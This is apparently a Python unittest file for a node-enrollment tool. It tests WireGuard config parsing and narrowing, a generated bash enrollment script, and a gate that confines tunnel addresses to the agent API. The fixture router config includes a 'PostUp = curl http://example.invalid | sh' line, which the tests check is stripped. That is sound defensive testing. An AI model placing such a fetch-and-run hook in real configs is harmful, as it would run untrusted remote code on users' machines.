"""Enroll node as one script (R161): a router's WireGuard config read,
narrowed to the controller, carried in a script that runs the provisioner;
and the controller answering a tunnel address on the agent's API alone."""
import base64
import os
import re
import shutil
import subprocess
import tempfile
import sys
import unittest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
import enrollscript as es  # noqa: E402
import nodes  # noqa: E402

ROUTER = """[Interface]
PrivateKey = cHJpdmF0ZWtleXByaXZhdGVrZXlwcml2YXRla2V5MDA=
Address = 10.6.0.5/32, fd00::5/128
DNS = 192.168.1.1
PostUp = curl http://example.invalid | sh

[Peer]
PublicKey = cHVibGlja2V5cHVibGlja2V5cHVibGlja2V5cHViMDA=
PresharedKey = cHJlc2hhcmVkcHJlc2hhcmVkcHJlc2hhcmVkcHJlMDA=
AllowedIPs = 0.0.0.0/0, ::/0
Endpoint = home.example.net:51820
"""


def answers(**kw):
    return {"reach": "wireguard", "controller": "http://192.168.1.16:7680",
            "wg_conf": ROUTER} | kw


def section(script, tag):
    m = re.search(rf"<<'{tag}'\n(.*?)\n{tag}\n", script, re.S)
    return base64.b64decode(m.group(1).replace("\n", "")) if m else None


class WireGuardConfig(unittest.TestCase):
    def test_the_router_config_is_read_for_the_node_address_and_its_peer(self):
        self.assertEqual(es.parse_wg(ROUTER), {"addr": "10.6.0.5", "endpoint": "home.example.net:51820"})

    def test_the_node_copy_routes_the_controller_alone_and_runs_nothing_of_its_own(self):
        out = es.narrow_wg(ROUTER, "192.168.1.16")
        self.assertIn("AllowedIPs = 192.168.1.16/32", out)
        self.assertNotIn("0.0.0.0/0", out)
        self.assertNotRegex(out, r"(?im)^\s*(DNS|PostUp)\s*=")
        self.assertIn("PersistentKeepalive = 25", out)
        self.assertIn("PresharedKey", out)

    def test_a_config_without_allowed_ips_gets_the_controller(self):
        conf = ROUTER.replace("AllowedIPs = 0.0.0.0/0, ::/0\n", "")
        self.assertIn("AllowedIPs = 192.168.1.16/32", es.narrow_wg(conf, "192.168.1.16"))

    def test_what_cannot_be_a_node_config_says_why(self):
        self.assertIn("PrivateKey", es.parse_wg("[Peer]\nPublicKey = x\n")["error"])
        self.assertIn("2 peers", es.parse_wg(ROUTER + "\n[Peer]\nPublicKey = y\nEndpoint = z:1\n")["error"])
        self.assertIn("IPv4", es.parse_wg(ROUTER.replace("10.6.0.5/32, ", ""))["error"])

    def test_through_the_tunnel_the_controller_is_an_address_not_a_name(self):
        self.assertIn("not a name", es.check(answers(controller="http://builderbot.lan:7680"))["error"])
        self.assertIn("URL", es.check(answers(controller="192.168.1.16"))["error"])
        self.assertIn("no such way", es.check(answers(reach="carrier-pigeon"))["error"])


class Script(unittest.TestCase):
    def build(self, **kw):
        ans = es.check(answers(**kw))
        return ans, es.build(ans, name="cloudbox", user="joe", token="bbe_tok'en",
                             expires=1_800_000_000, provisioner=b"#!/usr/bin/env bash\necho provision\n")

    def test_the_script_carries_the_provisioner_the_config_and_the_answers(self):
        ans, s = self.build(sessions=False)
        self.assertTrue(s.startswith("#!/usr/bin/env bash\n"))
        self.assertEqual(section(s, "PROVISIONER"), b"#!/usr/bin/env bash\necho provision\n")
        self.assertEqual(section(s, "WGCONF").decode(), ans["wg_conf"])
        run = next(x for x in s.splitlines() if x.startswith('bash "$dir/provision-linux.sh"'))
        self.assertIn("--controller 'http://192.168.1.16:7680'", run)
        self.assertIn("--token 'bbe_tok'\\''en'", run)
        self.assertIn("--user 'joe'", run)
        self.assertIn("--session-user none", run)
        self.assertIn('--wg-conf "$dir/bb.conf"', run)
        self.assertIn("private key", s)

    def test_on_the_lan_there_is_no_tunnel_in_it(self):
        ans = es.check({"reach": "lan", "controller": "http://builderbot.lan:7680"})
        s = es.build(ans, name="lanbox", user="bb", token="bbe_x", expires=0, provisioner=b"x")
        self.assertNotIn("WGCONF", s)
        self.assertNotIn("--user", s)
        self.assertEqual(es.home_rules(ans, 7680), "")

    def test_the_router_is_told_the_one_way_rule(self):
        ans, _ = self.build()
        rules = es.home_rules(ans, 7680)
        self.assertIn("ip saddr 10.6.0.5 ip daddr 192.168.1.16 tcp dport 7680 accept", rules)
        self.assertIn("ip saddr 10.6.0.5 drop", rules)

    def run_it(self, provisioner, *args, keep=None):
        """The script as a person runs it, with the root check left out and
        a stand-in provisioner. (exit code, the file after, what it printed)."""
        ans = es.check(answers())
        s = es.build(ans, name="cloudbox", user="bb", token="bbe_x", expires=0, provisioner=provisioner)
        s = s.replace('[ "$(id -u)" -eq 0 ]', "true")
        d = tempfile.mkdtemp()
        try:
            f = os.path.join(d, "enroll-cloudbox.sh")
            with open(f, "w") as fh:
                fh.write(keep if keep is not None else s)
            p = subprocess.run(["bash", f, *args], capture_output=True, text=True, timeout=30)
            with open(f) as fh:
                return p.returncode, fh.read(), p.stdout + p.stderr
        finally:
            shutil.rmtree(d, ignore_errors=True)

    def test_once_enrolled_the_script_keeps_itself_without_the_vpn_config(self):
        code, after, said = self.run_it(b'echo "provisioned with $*"\n')
        self.assertEqual(code, 0, said)
        self.assertIsNone(section(after, "WGCONF"))
        key = base64.b64encode(es.check(answers())["wg_conf"].encode()).decode()[:60]
        self.assertNotIn(key, after.replace("\n", ""))
        self.assertNotIn("PrivateKey", after)
        self.assertIn("install -m 600 /etc/wireguard/bb.conf", after)
        self.assertIsNotNone(section(after, "PROVISIONER"))
        self.assertIn("--wg-conf", said)
        self.assertIn("out of", said)
        # ...and what is left still runs: without the node's own config it
        # says where one comes from, rather than enrolling with none.
        code2, _, said2 = self.run_it(b"echo again\n", keep=after)
        self.assertEqual(code2, 1, said2)
        self.assertIn("make a new script", said2)

    def test_a_failed_run_keeps_the_config_for_another_try(self):
        code, after, said = self.run_it(b"exit 3\n")
        self.assertEqual(code, 3)
        self.assertIsNotNone(section(after, "WGCONF"), said)

    def test_flags_reach_the_provisioner(self):
        code, _, said = self.run_it(b'echo "provisioned with $*"\n', "--dev")
        self.assertEqual(code, 0, said)
        self.assertIn("--dev", said)

    def test_the_file_is_named_for_the_node(self):
        self.assertEqual(es.filename("cloud box/1"), "enroll-cloud-box-1.sh")


class TunnelGate(unittest.TestCase):
    def setUp(self):
        self.was = nodes.tunnel_addrs
        nodes.tunnel_addrs = lambda: frozenset({"10.6.0.5"})

    def tearDown(self):
        nodes.tunnel_addrs = self.was

    def test_a_tunnel_address_reaches_the_agent_api_and_nothing_else(self):
        self.assertEqual(nodes.tunnel_refuses("10.6.0.5", "/api/v1/agent/work"), "")
        for path in ("/", "/login", "/api/status", "/api/v1/nodes", "/term/ws"):
            self.assertIn("agent's API", nodes.tunnel_refuses("10.6.0.5", path), path)

    def test_any_other_address_is_not_this_gate_s(self):
        self.assertEqual(nodes.tunnel_refuses("192.168.1.20", "/api/status"), "")

    def test_the_address_comes_from_the_report_or_the_script(self):
        self.assertEqual(nodes.tunnel_addr({"config": {"tunnel": {"addr": "10.6.0.5"}}}), "10.6.0.5")
        self.assertEqual(nodes.tunnel_addr({"reported": {"tunnel": {"addr": "10.6.0.9"}},
                                            "config": {"tunnel": {"addr": "10.6.0.5"}}}), "10.6.0.9")
        self.assertEqual(nodes.tunnel_addr({"config": {"tunnel": {"addr": "not; an address"}}}), "")


if __name__ == "__main__":
    unittest.main()
